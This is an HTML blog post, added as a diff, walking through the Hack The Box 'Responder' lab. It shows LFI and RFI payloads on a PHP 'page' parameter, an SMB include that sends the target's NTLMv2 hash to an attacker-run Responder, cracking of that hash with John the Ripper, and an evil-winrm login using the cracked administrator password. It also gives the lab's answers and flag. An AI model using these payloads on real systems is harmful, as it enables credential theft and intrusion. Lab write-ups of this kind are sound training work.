@@ -1,0 +1,317 @@
+<!doctype html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="/images/favicon.png" />
+
+<title>[HTB] Responder&nbsp;|&nbsp;Wook&#39;s blog</title>
+<meta
+  name="title"
+  content="[HTB] Responder"
+/>
+<meta
+  name="description"
+  content="When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb The website has redirected the browser to a new URL, and my host doesn&rsquo;t know how to find unika.htb. This webserver is employing name-based Virtual Hosting for serving the requests.
+Name-Based Virtual Hosting is a method for hosting multiple domain names on a single server. The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that."
+/>
+<meta
+  name="keywords"
+  content="Hack The Box,"
+/>
+
+  <meta name="author" content="Wook Lee" />
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/htb-responder/">
+  <meta property="og:site_name" content="Wook&#39;s blog">
+  <meta property="og:title" content="[HTB] Responder">
+  <meta property="og:description" content="When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb The website has redirected the browser to a new URL, and my host doesn’t know how to find unika.htb. This webserver is employing name-based Virtual Hosting for serving the requests.
+Name-Based Virtual Hosting is a method for hosting multiple domain names on a single server. The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-07-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-07-13T00:00:00+00:00">
+    <meta property="article:tag" content="Hack The Box">
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="[HTB] Responder">
+  <meta name="twitter:description" content="When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb The website has redirected the browser to a new URL, and my host doesn’t know how to find unika.htb. This webserver is employing name-based Virtual Hosting for serving the requests.
+Name-Based Virtual Hosting is a method for hosting multiple domain names on a single server. The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.">
+
+
+
+
+
+  <meta itemprop="name" content="[HTB] Responder">
+  <meta itemprop="description" content="When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb The website has redirected the browser to a new URL, and my host doesn’t know how to find unika.htb. This webserver is employing name-based Virtual Hosting for serving the requests.
+Name-Based Virtual Hosting is a method for hosting multiple domain names on a single server. The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.">
+  <meta itemprop="datePublished" content="2024-07-13T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-07-13T00:00:00+00:00">
+  <meta itemprop="wordCount" content="822">
+  <meta itemprop="keywords" content="Hack The Box">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+    
+    <link href="/simple.min.css" rel="stylesheet" />
+
+    
+    <link href="/style.min.css" rel="stylesheet" />
+
+    
+
+    
+</head>
+
+  <body>
+    <header>
+      <nav>
+  <a
+    href="/"
+    
+    >Home</a
+  >
+
+  <a
+    href="/blog/"
+    
+    >Blog</a
+  >
+
+  <a
+    href="/photos/"
+    
+    >Photos</a
+  >
+
+
+  <a href="/index.xml">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 448 512">
+      
+      <path
+        d="M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM0 416a64 64 0 1 1 128 0A64 64 0 1 1 0 416zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z"
+      />
+    </svg>
+    RSS
+  </a>
+
+</nav>
+
+<h1>[HTB] Responder</h1>
+
+
+    </header>
+    <main>
+      
+  
+    
+      
+      <p>
+        <i>
+          <time datetime="2024-07-13" pubdate>
+            2024-07-13
+          </time>
+        </i>
+      </p>
+    
+  
+  
+  <content>
+    <h4 id="when-visiting-the-web-service-using-the-ip-address-what-is-the-domain-that-we-are-being-redirected-to">When visiting the web service using the IP address, what is the domain that we are being redirected to?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>unika.htb</code></pre>
+<p>The website has redirected the browser to a new URL, and my host doesn&rsquo;t know how to find <code>unika.htb</code>. This webserver is employing name-based Virtual Hosting for serving the requests.</p>
+<p><code>Name-Based Virtual Hosting</code> is a method for hosting multiple domain names on a single server. The web server checks the domain name provided in the <code>Host</code> header field of the HTTP request and sends a response according to that.</p>
+<p><img src="image.png#center" alt="alt text"></p>
+<br>
+<p>The <code>/etc/hosts</code> file is used to resolve a hostname into an IP address &amp; thus we will need to add an entry for this domain to enable the browser to resolve the address for <code>unika.htb</code>. That&rsquo;s why the screen is currently black showing nothing.</p>
+<p>Entry in the <code>/etc/hosts</code> file:</p>
+<p><code>echo &quot;10.129.172.140   unika.htb&quot; | sudo tee -a /etc/hosts</code></p>
+<p><img src="image-2.png#center" alt="alt text"></p>
+<br>
+<p>After we had appended the entry, I refreshed the page and the website now showed everything properly.
+<img src="image-3.png#center" alt="alt text"></p>
+<br>
+<h4 id="which-scripting-language-is-being-used-on-the-server-to-generate-webpages">Which scripting language is being used on the server to generate webpages?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>PHP</code></pre>
+<p><img src="image-1.png#center" alt="alt text"></p>
+<br>
+<h4 id="what-is-the-name-of-the-url-parameter-which-is-used-to-load-different-language-versions-of-the-webpage">What is the name of the URL parameter which is used to load different language versions of the webpage?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>page</code></pre>
+<p><img src="image-4.png#center" alt="alt text"></p>
+<br>
+<h4 id="which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-local-file-include-lfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) Vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>../../../../../../../../windows/system32/drivers/etc/hosts</code></pre>
+<br>
+<h4 id="which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-remote-file-include-rfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>//10.10.14.6/somefile</code></pre>
+<p>LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common examples is when an application uses the path to a file as input. If the applications treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the <code>../</code> string in the inputted file name and eventually view sensitive files in the local file system.</p>
+<p>RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTC, etc.</p>
+<br>
+<h4 id="what-does-ntlm-stand-for">What does NTLM stand for?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>New Technology LAN Manager</code></pre>
+<p>NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain.</p>
+<br>
+<h4 id="which-flag-do-we-use-in-the-responder-utility-to-specfiy-the-network-interface">Which flag do we use in the Responder utility to specfiy the network interface?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>-I</code></pre>
+<p><img src="image-5.png#center" alt="alt text"></p>
+<br>
+<p>We just saw that <code>LFI</code> is possible as we can view the contents of the <code>C:\windows\system32\drivers\etc\hosts</code> file in the response.
+The file inclusion was made possible because in the backend the <code>include()</code> method of PHP is being used to process the URL parameter <code>page</code> for serving a different webpage for different languages.</p>
+<p>In the PHP configuration file <code>php.ini</code>, &ldquo;allow_url_include&rdquo; wrapper is set to &ldquo;Off&rdquo; by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if <code>allow_url_include</code> and <code>allow_url_fopen</code> are set to &ldquo;Off&rdquo;, PHP will not prevent the loading of SMB URLs. In our case, we can misuse this functionality to steal the NTLM hash.</p>
+<p>Verify that the <code>Responder.conf</code> is sent to listen for SMB requests. With the configuration file ready, we can proceed to start Responder with <code>python3</code>, passing in the interface to listen on using the <code>-I</code> flag.</p>
+<p><img src="image-6.png#center" alt="alt text"></p>
+<br>
+<p>Starting Responder by running the following command: <code>sudo python3 Responder.py -I tun0</code></p>
+<p><img src="image-7.png#center" alt="alt text"></p>
+<br>
+<p>With the Responder server ready, we tell the server to include a resource from our SMB server by setting the <code>page</code> parameter as follows via the web browser.</p>
+<p><code>http://unika.htb/?page=//10.10.14.28/somefile</code></p>
+<p><img src="image-8.png#center" alt="alt text"></p>
+<br>
+<p>Now we let&rsquo;s crack the hash using the John the Ripper.</p>
+<br>
+<h4 id="there-are-several-tools-that-take-a-netntlmv2-challengeresponse-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-one-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what">There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as &lsquo;john&rsquo;, but the full name is what?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>John the Ripper</code></pre>
+<br>
+<h4 id="what-is-the-password-for-the-administrator-user">What is the password for the administrator user?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>badminton</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ <span style="color:#89dceb">echo</span> <span style="color:#a6e3a1">&#34;Administrator::RESPONDER:8a9c5ae98bb0afe8:B5337356E784F427FCA011E764465155:010100000000000000091E577FD5DA01F2AE6AA5DEA6
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#a6e3a1">0C990000000002000800430044005500380001001E00570049004E002D0058004F004100460043004F0052005500550049004A0004003400570049004E002D005
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#a6e3a1">8004F004100460043004F0052005500550049004A002E0043004400550038002E004C004F00430041004C000300140043004400550038002E004C004F00430041
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#a6e3a1">004C000500140043004400550038002E004C004F00430041004C000700080000091E577FD5DA01060004000200000008003000300000000000000001000000002
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#a6e3a1">0000031C85E41ABB6A4BB8A30F1CF440450559198FFDF38BC3047031571CB1CA793290A0010000000000000000000000000000000000009002000630069006600
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#a6e3a1">73002F00310030002E00310030002E00310034002E00320038000000000000000000&#34;</span> &gt; hash.txt</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ john -w<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>netntlmv2, NTLMv2 C/R <span style="color:#89dceb;font-weight:bold">[</span>MD4 HMAC-MD5 32/64<span style="color:#89dceb;font-weight:bold">])</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Will run <span style="color:#fab387">2</span> OpenMP threads
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>badminton        <span style="color:#89dceb;font-weight:bold">(</span>Administrator<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>1g 0:00:00:00 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-14 00:02<span style="color:#89dceb;font-weight:bold">)</span> 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Use the <span style="color:#a6e3a1">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Session completed.</span></span></code></pre></div>
+<br>
+<h4 id="well-use-a-window-service-ie-running-on-the-box-to-remotely-across-the-responder-machine-using-the-password-we-recovered-what-port-tcp-does-it-listen-on">We&rsquo;ll use a Window service (i.e. running on the box) to remotely across the Responder machine using the password we recovered. What port TCP does it listen on?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>5985</code></pre>
+<p><img src="image-9.png#center" alt="alt text"></p>
+<br>
+<h4 id="submit-root-flag">Submit root flag</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>ea81b7afddd03efaa0945333ed147fac</code></pre>
+<p>We will connect to the WinRM service on the target and try to get a session. Because Powershell isn&rsquo;t installed on Linux by default, we&rsquo;ll use a tool called <code>Evil-WinRM</code>.</p>
+<p><code>evil-winrm -i 10.129.172.140 -u administrator -p badminton</code></p>
+<p><img src="image-10.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-11.png" alt="alt text"></p>
+
+  </content>
+  
+  <p>
+    
+    <a href="/blog/hack-the-box/">#Hack The Box</a>&nbsp;&nbsp;
+    
+  </p>
+
+    </main>
+    <footer>
+      
+
+  <span>
+    
+    Made with
+    <a href="https://github.com/maolonglong/hugo-simple/">Hugo ʕ•ᴥ•ʔ Simple</a>
+  </span>
+
+
+    </footer>
+
+    
+</body>
+</html>
